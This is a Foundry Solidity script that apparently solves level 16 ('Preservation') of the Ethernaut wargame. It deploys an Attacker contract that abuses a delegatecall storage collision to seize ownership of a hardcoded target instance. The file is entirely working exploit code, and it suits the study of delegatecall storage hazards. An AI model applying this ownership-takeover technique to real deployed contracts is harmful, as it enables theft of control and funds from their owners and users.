// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import{Script,console} from "forge-std/Script.sol";
import{Preservation} from "../src/Level16.sol";
contract Attacker{
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    //target: address of targetContract i.e. Preservation
    function exploit(Preservation target) external{
            target.setFirstTime(uint256(uint160(address(this))));
            target.setFirstTime(uint256(uint160(msg.sender)));
            require(target.owner()==msg.sender,"hack failed");        
    }

    function setTime(uint256 _owner) external{
        owner=address(uint160(_owner));
    }

}
contract Level16Solution is Script{
    Preservation instance=Preservation(0x22a5695B30863D97Bc125d5A1a72421f2464E0f4);
    function run() external{
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            console.log("owner before hack",instance.owner());
            console.log(instance.timeZone1Library());
            console.log(instance.timeZone2Library());
            Attacker attacker=new Attacker();
            attacker.exploit(instance);
            
            console.log("owner after hack",instance.owner());
            console.log(instance.timeZone1Library());
            console.log(instance.timeZone2Library());
            vm.stopBroadcast();
    }
}